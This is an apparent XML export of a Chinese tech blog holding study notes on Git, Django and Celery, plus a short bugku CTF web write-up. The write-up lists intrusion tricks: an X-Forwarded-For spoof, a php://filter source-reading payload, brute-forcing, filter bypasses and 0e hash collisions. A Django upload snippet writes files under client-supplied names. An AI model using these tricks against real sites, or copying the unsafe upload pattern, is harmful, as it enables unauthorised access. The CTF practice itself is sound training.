推送分支推送分支，就是把该分支上的所有本地提交推送到远程库。推送时，要指定本地分支，这样，Git就会把该分支推送到远程库对应的远程分支上： 1$ git push origin master 如果要推送其他分支，比如dev，就改成： 1$ git push origin dev 但是，并不是一定要把本地分支往远程推送，那么，哪些分支需要推送，哪些不需要呢？ master分支是主分支，因此要时刻与远程同步； dev分支是开发分支，团队所有成员都需要在上面工作，所以也需要与远程同步； bug分支只用于在本地修复bug，就没必要推到远程了，除非老板要看看你每周到底修复了几个bug； feature分支是否推到远程，取决于你是否和你的小伙伴合作在上面开发。 总之，就是在Git中，分支完全可以在本地自己藏着玩，是否推送，视你的心情而定！ 抓取分支clone 默认只抓取master 分支，利用这个命令获取并创建其他分支 git checkout -b dev origin/dev 多人协作因此，多人协作的工作模式通常是这样： 首先，可以试图用git push origin推送自己的修改； 如果推送失败，则因为远程分支比你的本地更新，需要先用git pull试图合并； 如果合并有冲突，则解决冲突，并在本地提交； 没有冲突或者解决掉冲突后，再用git push origin推送就能成功！ 如果git pull提示no tracking information，则说明本地分支和远程分支的链接关系没有创建，用命令git branch --set-upstream-to origin/。 这就是多人协作的工作模式，一旦熟悉了，就非常简单。 小结 查看远程库信息，使用git remote -v； 本地新建的分支如果不推送到远程，对其他人就是不可见的； 从本地推送分支，使用git push origin branch-name，如果推送失败，先用git pull抓取远程的新提交； 在本地创建和远程分支对应的分支，使用git checkout -b branch-name origin/branch-name，本地和远程分支的名称最好一致； 建立本地分支和远程分支的关联，使用git branch --set-upstream branch-name origin/branch-name； 从远程抓取分支，使用git pull，如果有冲突，要先处理冲突。 标签 命令git tag用于新建一个标签，默认为HEAD，也可以指定一个commit id； 命令git tag -a -m &quot;blablabla...&quot;可以指定标签信息； 命令git tag可以查看所有标签。 推送 命令git push origin &lt;tagname&gt;可以推送一个本地标签； 命令git push origin --tags可以推送全部未推送过的本地标签； 命令git tag -d可以删除一个本地标签； 命令git push origin :refs/tags/&lt;tagname&gt;可以删除一个远程标签。 变基rebase操作可以把本地未push的分叉提交历史整理成直线； rebase的目的是使得我们在查看历史提交的变化时更容易，因为分叉的提交需要三方对比。]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[火车信息数据库结构设计]]></title>
    <url>%2Fold_post%2F%E7%81%AB%E8%BD%A6%E4%BF%A1%E6%81%AF%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BB%93%E6%9E%84%E8%AE%BE%E8%AE%A1.html</url>
    <content type="text"><![CDATA[Please enter the password to read the blog. Incorrect Password! No content to display! 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]]></content>
      <categories>
        <category>杂乱</category>
      </categories>
      <tags>
        <tag>大创</tag>
        <tag>数据库</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Django高级]]></title>
    <url>%2Fold_post%2FDjango%E9%AB%98%E7%BA%A7.html</url>
    <content type="text"><![CDATA[传智博客的python的笔记 静态文件处理配置静态文件 在settings 文件中定义静态内容 1234STATIC_URL = &apos;/static/&apos;STATICFILES_DIRS = [ os.path.join(BASE_DIR, &apos;static&apos;),] 在项目根目录下创建static目录，再创建当前应用名称的目录 1mysite/static/myapp/ 在模板中可以使用硬编码 1/static/my_app/myexample.jpg 在模板中可以使用static编码 1&#123; % load static from staticfiles %&#125; 中间件 是一个底层 的插件的系统，影响mvt的个个流程 每个中间件组件是一个独立的Python类，可以定义下面方法中的一个或多个 __init_ _：无需任何参数，服务器响应第一个请求的时候调用一次，用于确定是否启用当前中间件 process_request(request)：执行视图之前被调用，在每个请求上调用，返回None或HttpResponse对象 process_view(request, view_func, view_args, view_kwargs)：调用视图之前被调用，在每个请求上调用，返回None或HttpResponse对象 process_template_response(request, response)：在视图刚好执行完毕之后被调用，在每个请求上调用，返回实现了render方法的响应对象 process_response(request, response)：所有响应返回浏览器之前被调用，在每个请求上调用，返回HttpResponse对象 process_exception(request,response,exception)：当视图抛出异常时调用，在每个请求上调用，返回一个HttpResponse对象 示例：自定义异常处理 在应用目录下写一个类，在与settings.py的MIDDLEWARE_CLASSES中注册，格式为booktest.文件名 上传图片背景文件数据被保存在request.FILES，键为input的name属性 注意：FILES只有在请求的方法为POST 且提交的带有enctype=”multipart/form-data”的属性 的情况下才会包含数据。否则，FILES 将为一个空的类似于字典的对象 图片处理使用模型使用模型处理上传文件：将属性定义成models.ImageField类型pic=models.ImageField(upload_to=’cars/‘)注意：如果属性类型为ImageField需要安装包Pilowpip install Pillow==3.4.1 手动上传 在静态文件目录创建media文件夹 打开settings.py文件，增加media_root项MEDIA_ROOT=os.path.join(BASE_DIR,”static/media”) 使用.write文件写入 123456789101112from django.conf import settingsdef upload(request): if request.method == &quot;POST&quot;: f1 = request.FILES[&apos;pic&apos;] fname = &apos;%s/cars/%s&apos; % (settings.MEDIA_ROOT,f1.name) with open(fname, &apos;w&apos;) as pic: for c in f1.chunks(): pic.write(c) return HttpResponse(&quot;ok&quot;) else: return HttpResponse(&quot;error&quot;) admin站点 通过使用startproject创建的项目模版中，默认Admin被启用 1.创建管理员的用户名和密码 12python manage.py createsuperuser然后按提示填写用户名、邮箱、密码 2.在应用内admin.py文件完成注册，就可以在后台管理中维护模型的数据 1234from django.contrib import adminfrom models import *admin.site.register(HeroInfo) 查找admin文件：在INSTALLED_APPS项中加入django.contrib.admin，Django就会自动搜索每个应用的admin模块并将其导入 ModelAdmin对象modeladmin类是模型在admin界面的表现形式，使用方法 注册定义modeladmin类后 使用方式一：注册参数 1admin.site.register(HeroInfo,HeroAdmin) 使用方式二：注册装饰器在modeladmin类后前以装饰器注册模型里的类 12@admin.register(HeroInfo)class HeroAdmin(admin.ModelAdmin): ### 通过重写admin.ModelAdmin的属性规定显示效果，属性主要分为列表页、增加修改页两部分 列表页选项“操作选项”的位置 actions_on_top、actions_on_bottom：默认显示在页面的顶部，对数据进行操作的按钮 123class HeroAdmin(admin.ModelAdmin): actions_on_top = True actions_on_bottom = True list_display 出现列表中显示的字段 列表类型 在列表中，可以是字段名称，也可以是方法名称，但是方法名称默认不能排序 在方法中可以使用format_html()输出html内容 123456789101112131415在models.py文件中from django.db import modelsfrom tinymce.models import HTMLFieldfrom django.utils.html import format_htmlclass HeroInfo(models.Model): hname = models.CharField(max_length=10) hcontent = HTMLField() isDelete = models.BooleanField() def hContent(self): return format_html(self.hcontent)在admin.py文件中class HeroAdmin(admin.ModelAdmin): list_display = [&apos;hname&apos;, &apos;hContent&apos;] 让方法排序，为方法指定admin_order_field属性 1234在models.py中HeroInfo类的代码改为如下： def hContent(self): return format_html(self.hcontent) hContent.admin_order_field = &apos;hname&apos; 标题栏名称：将字段封装成方法，为方法设置short_description属性 123456789在models.py中为HeroInfo类增加方法hName： def hName(self): return self.hname hName.short_description = &apos;姓名&apos; hContent.short_description = &apos;内容&apos;在admin.py页中注册class HeroAdmin(admin.ModelAdmin): list_display = [&apos;hName&apos;, &apos;hContent&apos;] list_filter 右侧栏过滤器，将模型下的一个属性值进行值进行分组，可选择显示一个相同内容的其他不同的字段 列表类型 只能接收字段 123class HeroAdmin(admin.ModelAdmin): ... list_filter = [&apos;hname&apos;, &apos;hcontent&apos;] list_per_page 每页中显示多少项，默认设置为100 123class HeroAdmin(admin.ModelAdmin): ... list_per_page = 10 search_fields 搜索框 列表类型，表示在这些字段上进行搜索 只能接收字段 123class HeroAdmin(admin.ModelAdmin): ... search_fields = [&apos;hname&apos;] 增加与修改页选项 fields：显示字段的顺序，如果使用元组表示显示到一行上 123class HeroAdmin(admin.ModelAdmin): ... fields = [(&apos;hname&apos;, &apos;hcontent&apos;)] fieldsets：分组显示将模型内的属性值分组显示 123456class HeroAdmin(admin.ModelAdmin): ... fieldsets = ( (&apos;base&apos;, &#123;&apos;fields&apos;: (&apos;hname&apos;)&#125;), (&apos;other&apos;, &#123;&apos;fields&apos;: (&apos;hcontent&apos;)&#125;) ) fields与fieldsets两者选一 InlineModelAdmin对象 类型InlineModelAdmin：表示在模型的添加或修改页面嵌入关联模型，既数据库一对多或其他的关系，的添加或修改 使用方法，定义一个子类，作为原来类 的属性 子类TabularInline：以表格的形式嵌入 子类StackedInline：以块的形式嵌入 1234567class HeroInline(admin.TabularInline): model = HeroInfoclass BookAdmin(admin.ModelAdmin): inlines = [ HeroInline, ] 重写admin模板 在项目所在目录中创建templates目录，再创建一个admin目录 设置模板查找目录：修改settings.py的TEMPLATES项，加载模板时会在DIRS列表指定的目录中搜索 使用用来admin模板的标签 1&apos;DIRS&apos;: [os.path.join(BASE_DIR, &apos;templates&apos;)], 分页paginator 对象、 Paginator(列表,int)：返回分页对象，参数为列表数据，每面数据的条数 属性 count：对象总数 num_pages：页面总数 page_range：页码列表，从1开始，例如[1, 2, 3, 4] 方法 page(num)：下标以1开始，返回一个page对象，如果提供的页码不存在，抛出InvalidPage异常 异常exception InvalidPage：当向page()传入一个无效的页码时抛出 PageNotAnInteger：当向page()传入一个不是整数的值时抛出 EmptyPage：当向page()提供一个有效值，但是那个页面上没有任何对象时抛出 Page对象 Paginator对象的page()方法返回Page对象，不需要手动构造 属性 object_list：当前页上所有对象的列表 number：当前页的序号，从1开始 paginator：当前page对象相关的Paginator对象 方法 has_next()：如果有下一页返回True has_previous()：如果有上一页返回True has_other_pages()：如果有上一页或下一页返回True next_page_number()：返回下一页的页码，如果下一页不存在，抛出InvalidPage异常 previous_page_number()：返回上一页的页码，如果上一页不存在，抛出InvalidPage异常 len()：返回当前页面对象的个数 迭代页面对象：访问当前页面中的每个对象 第三方富文本编辑器 在网站pypi网站搜索并下载”django-tinymce-2.4.0” 解压 1tar zxvf django-tinymce-2.4.0.tar.gz 进入解压后的目录，工作在虚拟环境，安装 1python setup.py install 应用到项目中 在settings.py中为INSTALLED_APPS添加编辑器应用 1234INSTALLED_APPS = ( ... &apos;tinymce&apos;,) 在settings.py中添加编辑配置项 12345TINYMCE_DEFAULT_CONFIG = &#123; &apos;theme&apos;: &apos;advanced&apos;, &apos;width&apos;: 600, &apos;height&apos;: 400,&#125; 在根urls.py中配置 1234urlpatterns = [ ... url(r&apos;^tinymce/&apos;, include(&apos;tinymce.urls&apos;)),] 在应用中定义模型的属性 123456from django.db import modelsfrom tinymce.models import HTMLFieldclass HeroInfo(models.Model): ... hcontent = HTMLField() 在后台管理界面中，就会显示为富文本编辑器，而不是多行文本框 自定义使用123456789101112131415&lt;script type=&quot;text/javascript&quot;&gt; tinyMCE.init(&#123; &apos;mode&apos;:&apos;textareas&apos;, &apos;theme&apos;:&apos;advanced&apos;, &apos;width&apos;:400, &apos;height&apos;:100 &#125;); &lt;/script&gt; &lt;script type=&quot;text/javascript&quot; src=&apos;/static/tiny_mce/tiny_mce.js&apos;&gt;&lt;/script&gt; # 需要在安装目录找到这个脚本，配置&lt;form method=&quot;post&quot; action=&quot;/content/&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;hname&quot;&gt; &lt;br&gt; &lt;textarea name=&apos;hcontent&apos;&gt;哈哈，这是啥呀&lt;/textarea&gt; &lt;br&gt; &lt;input type=&quot;submit&quot; value=&quot;提交&quot;&gt; 缓存设置缓存 通过设置决定把数据缓存在哪里，是数据库中、文件系统还是在内存中 通过setting文件的CACHES配置来实现 参数TIMEOUT：缓存的默认过期时间，以秒为单位，这个参数默认是300秒，即5分钟；设置TIMEOUT为None表示永远不会过期，值设置成0造成缓存立即失效 123456CACHES=&#123; &apos;default&apos;: &#123; &apos;BACKEND&apos;: &apos;django.core.cache.backends.locmem.LocMemCache&apos;, &apos;TIMEOUT&apos;: 60, &#125;&#125; 可以将cache存到redis中，默认采用1数据库，需要安装包并配置如下： 123456789安装包：pip install django-redis-cacheCACHES = &#123; &quot;default&quot;: &#123; &quot;BACKEND&quot;: &quot;redis_cache.cache.RedisCache&quot;, &quot;LOCATION&quot;: &quot;localhost:6379&quot;, &apos;TIMEOUT&apos;: 60, &#125;,&#125; 可以连接redis查看存的数据 1234连接：redis-cli切换数据库：select 1查看键：keys *查看值：get 键 单个view缓存 django.views.decorators.cache定义了cache_page装饰器，用于对视图的输出进行缓存 示例代码如下： 123456from django.views.decorators.cache import cache_page@cache_page(60 * 15)def index(request): return HttpResponse(&apos;hello1&apos;) #return HttpResponse(&apos;hello2&apos;) cache_page接受一个参数：timeout，秒为单位，上例中缓存了15分钟 视图缓存与URL无关，如果多个URL指向同一视图，每个URL将会分别缓存 模板片断缓存 使用cache模板标签来缓存模板的一个片段 需要两个参数： 缓存时间，以秒为单位 给缓存片段起的名称 示例代码如下： 12345&#123;% load cache %&#125;&#123;% cache 500 hello %&#125;hello1&#123;% endcache %&#125; 底层的缓存API可以缓存某一个具体的值123456from django.core.cache import cache设置：cache.set(键,值,有效时间)获取：cache.get(键)删除：cache.delete(键)清空：cache.clear() celery 官方网站 中文文档 解决用户浏览异步或者网站定时任务的问题 名词 任务task：就是一个Python函数 队列queue：将需要执行的任务加入到队列中 工人worker：在一个新进程中，负责执行队列中的任务 代理人broker：负责调度，在布置环境中使用redis 使用 安装包 123celery==3.1.25celery-with-redis==3.0django-celery==3.1.17 配置settings 1234567891011INSTALLED_APPS = ( ... &apos;djcelery&apos;,&#125;...import djcelerydjcelery.setup_loader()BROKER_URL = &apos;redis://127.0.0.1:6379/0&apos; # 使用rediss 的0数据库CELERY_IMPORTS = (&apos;应用名称.task&apos;) 在应用目录下创建task.py文件 12345678import timefrom celery import task@taskdef sayhello(): print(&apos;hello ...&apos;) time.sleep(2) print(&apos;world ...&apos;) 迁移，生成celery需要的数据表 1python manage.py migrate 启动Redis 1sudo redis-server /etc/redis/redis.conf 启动worker 1python manage.py celery worker --loglevel=info 调用语法 1function.delay(parameters) 使用代码 1234567891011#from task import *def sayhello(request): print(&apos;hello ...&apos;) import time time.sleep(10) print(&apos;world ...&apos;) # sayhello.delay() return HttpResponse(&quot;hello world&quot;) 在视图中sayhello.delay()使用sayhello函数，可以实现异步执行，可以传入参数]]></content>
      <categories>
        <category>web开发</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>Django</tag>
        <tag>python</tag>
        <tag>web开发</tag>
        <tag>mvt</tag>
        <tag>mvc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DjangoTemples]]></title>
    <url>%2Fold_post%2FDjangoTemples.html</url>
    <content type="text"><![CDATA[传智博客的python的笔记 定义模板 模板语言包括 变量 标签 { % 代码块 % } 过滤器 注释 变量 语法： 1&#123;&#123; variable &#125;&#125; 可以调用对象的方法，当模版引擎遇到点(“.”)，会按照下列顺序查询： 字典查询，例如：foo[“bar”] 属性或方法查询，例如：foo.bar 数字索引查询，例如：foo[bar] 如果变量不存在， 模版系统将插入’’ (空字符串) 在模板中调用方法时不能传递参数 过滤器 语法：{ { 变量|过滤器 }}，例如{ { name|lower }}，表示将变量name的值变为小写输出 使用管道符号 (|)来应用过滤器 通过使用过滤器来改变变量的计算结果 可以在if标签中使用过滤器结合运算符 1if list1|length &gt; 1 过滤器能够被“串联”，构成过滤器链 1name|lower|upper 过滤器可以传递参数，参数使用引号包起来 1list|join:&quot;, &quot; default：如果一个变量没有被提供，或者值为false或空，则使用默认值，否则使用变量的值 1value|default:&quot;什么也没有&quot; date：根据给定格式对一个date变量格式化 1value|date:&apos;Y-m-d&apos; escape：详见“HTML转义” 点击查看详细的过滤器 标签 语法：{ % tag % } 作用 在输出中创建文本 控制循环或逻辑 加载外部信息到模板中供以后的变量使用 for标签 123456&#123; %for ... in ...%&#125;循环逻辑&#123;&#123;forloop.counter&#125;&#125;表示当前是第几次循环&#123; %empty%&#125;给出的列表为或列表不存在时，执行此处&#123; %endfor%&#125; if标签 1234567&#123; %if ...%&#125;逻辑1&#123; %elif ...%&#125;逻辑2&#123; %else%&#125;逻辑3&#123; %endif%&#125; comment标签 123&#123; % comment % &#125;多行注释&#123; % endcomment % &#125; include：加载模板并以标签内的参数渲染 1&#123; %include &quot;foo/bar.html&quot; % &#125; url：反向解析booktest 为included的namespace，name为url的名字，后面两个是匹配的视图中匹配的变量可以为多个，字符需要加双引号 /（）/（） 1&#123; % url &apos;booktest:name&apos; 123 &apos;13a&apos; %&#125; csrf_token：这个标签用于跨站请求伪造保护 1&#123; % csrf_token %&#125; 布尔标签：and、or，and比or的优先级高 block、extends：详见“模板继承” autoescape：详见“HTML转义” html 转义转义字符django默认自动转义，所有escape过滤器，没什么用123456789&lt; 会转换为&lt;&gt; 会转换为&gt;&apos; (单引号) 会转换为&apos;&quot; (双引号)会转换为 &quot;&amp; 会转换为 &amp; 关闭转义 如果在模板中用default通过|给变量设置了默认值，默认值不会被专业，需要手动转义 对于变量使用safe过滤器 1&#123;&#123; data|safe &#125;&#125; 对于代码块使用autoescape标签 123&#123; % autoescape off %&#125;&#123;&#123; body &#125;&#125;&#123; % endautoescape %&#125; 标签autoescape接受on或者off参数 自动转义标签在base模板中关闭，则在child模板中也是关闭的，不太明白，是如果base模板有，chlid模板不变吗？ 注释 单行注释 1&#123;#...#&#125; 注释可以包含任何模版代码，有效的或者无效的都可以 1&#123;# &#123; % if foo % &#125;bar&#123; % else % &#125; #&#125; 使用comment标签注释模版中的多行内容 模板继承 block标签：在父模板中预留区域，在子模板中填充，名字必须唯一 extends继承：继承，必须写在模板文件的第一行 定义父模板base.htm 1234&#123; %block 模板名%&#125;这里可以定义默认值,若子模版为填充值，则使用默认值如果不定义默认值，则表示空字符串&#123; %endblock%&#125; 定义子模板index.html，使用extends引用父模板，地址从模板定义的目录开始写 1&#123; % extends &quot;base.html&quot; %&#125; 在子模板中使用block填充预留区域 123&#123; %block 模板名%&#125;实际填充内容&#123; %endblock%&#125;]]></content>
      <categories>
        <category>web开发</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>Django</tag>
        <tag>python</tag>
        <tag>web开发</tag>
        <tag>mvt</tag>
        <tag>mvc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bugku-1]]></title>
    <url>%2Fold_post%2Fbugku-1.html</url>
    <content type="text"><![CDATA[0x0因为前面几道题比较简单，而且是之前做的的，就大概写写了 0x1 第一题看源码 第二题改html，这个应该是xss用的，破解限制长度 get，post，http里的东西 php弱类型比较，传1a就行 域名解析，还是http的，改host九型 用burp repeater 就可以停下分析了 file(“flag.php”)这个好像可以闭合那个括号然后干一些。。。。，我后来登的时候服务器已经被玩坏了， 变量覆盖，用GLOBALS读出有变量 web5 把源码了的方框执行，在换成大写 在http头里面 用bp抓包 go一下 就发现了flag 管理员系统，先查看源码，最后一行发现base64编码，解码，拿到管理员密码，登录显示非管理员，在头部添加 X-Forwarded-For : 127.0.0.1 拿到flag JSFuck,查看源码，把 eval 改成console.log，得到1234567891011function checkSubmit()&#123;vara=document.getElementById("password"); if("undefined"!=typeof a)&#123; if("67d709b2b54aa2aa648cf6e87a7114f1"==a.value) return!0; alert("Error"); a.focus(); return!1 &#125;&#125;document.getElementById("levelQuest").onsubmit=checkSubmit; 提交67..拿到flag 文件包含，利用php伪协议 php://filter/read/convert.base64-encode/resource=index.php 解码，拿到index.php源码，flag 6位纯数字，burp暴力破解之 控制台直接改变量 访问index.php.bak查看源码，key之过滤了一次，kekeyy绕过，传数组或弱类型比较，0e碰撞]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
        <tag>ctf</tag>
        <tag>bugku</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DjangoModels]]></title>
    <url>%2Fold_post%2FDjangoModels.html</url>
    <content type="text"><![CDATA[传智博客的python的笔记 基本配置数据库配置ORM简介 MVC框架中包括一个重要的部分，就是ORM，它实现了数据模型与数据库的解耦，即数据模型的设计不需要依赖于特定的数据库，通过简单的配置就可以轻松更换数据库 ORM是“对象-关系-映射”的简称，主要任务是： 根据对象的类型生成表结构 将对象、列表的操作，转换为sql语句 将sql查询到的结果转换为对象、列表 这极大的减轻了开发人员的工作量，不需要面对因数据库变更而导致的无效劳动 Django中的模型包含存储数据的字段和约束，对应着数据库中唯一的表 使用MySql数据库 在settings.py文件中，通过DATABASES项进行数据库设置 django支持的数据库包括：sqlite、mysql等主流数据库 Django默认使用SQLite数据库 在虚拟环境中安装mysql包 1pip install mysql-python 在mysql中创建数据库 1create databases test2 charset=utf8 打开settings.py文件，修改DATABASES项 12345678910DATABASES = &#123; &apos;default&apos;: &#123; &apos;ENGINE&apos;: &apos;django.db.backends.mysql&apos;, &apos;NAME&apos;: &apos;test2&apos;, &apos;USER&apos;: &apos;用户名&apos;, &apos;PASSWORD&apos;: &apos;密码&apos;, &apos;HOST&apos;: &apos;数据库服务器ip，本地可以使用localhost&apos;, &apos;PORT&apos;: &apos;端口，默认为3306&apos;, &#125;&#125; 开发流程 在models.py中定义模型类，要求继承自models.Model 把应用加入settings.py文件的installed_app项 生成迁移文件 执行迁移生成表 使用模型类进行crud操作，crud是指在做对数据的增加(Create)、读取查询(Retrieve)、更新(Update)和删除(Delete) 使用数据库生成模型类1python manage.py inspectdb &gt; booktest/models.py 模型的定义定义模型 在模型中定义属性，会生成表中的字段 django根据属性的类型确定以下信息： 当前选择的数据库支持字段的类型 渲染管理表单时使用的默认html控件，html中post的数据的接受 在管理站点最低限度的验证 django会为表增加自动增长的主键列，每个模型只能有一个主键列，如果使用选项设置某属性为主键列后，则django不会再生成默认的主键列 属性命名限制 不能是python的保留关键字 由于django的查询方式，不允许使用连续的下划线，仅允许单个下划线 定义属性 定义属性时，需要字段类型,属性名在数据库中是应用名_小写属性明 字段类型被定义在django.db.models.fields目录下，为了方便使用，被导入到django.db.models中 使用方式 导入from django.db import models 通过models.Field创建字段类型的对象，赋值给属性 对于重要数据都做逻辑删除，不做物理删除，实现方法是定义isDelete属性，类型为BooleanField，默认值为False 字段类型 AutoField：一个根据实际ID自动增长的IntegerField，通常不指定默认为pk 如果不指定，一个主键字段将自动添加到模型中 